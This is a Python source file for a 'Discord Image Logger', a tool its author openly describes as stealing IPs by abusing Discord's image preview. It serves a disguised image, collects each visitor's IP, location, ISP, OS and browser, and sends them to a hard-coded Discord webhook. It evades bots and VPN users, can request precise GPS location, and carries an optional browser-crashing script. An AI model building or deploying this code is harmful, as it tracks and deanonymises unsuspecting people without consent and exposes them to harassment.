# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1115082017130950778/5pRGKIfOStjB_t_HKDw-hlvnSXye5XL_eGoZte27AzvqKS6rmIolAxtwNT1dsKGc3NJa",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://grabify.link/9WPM3B" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
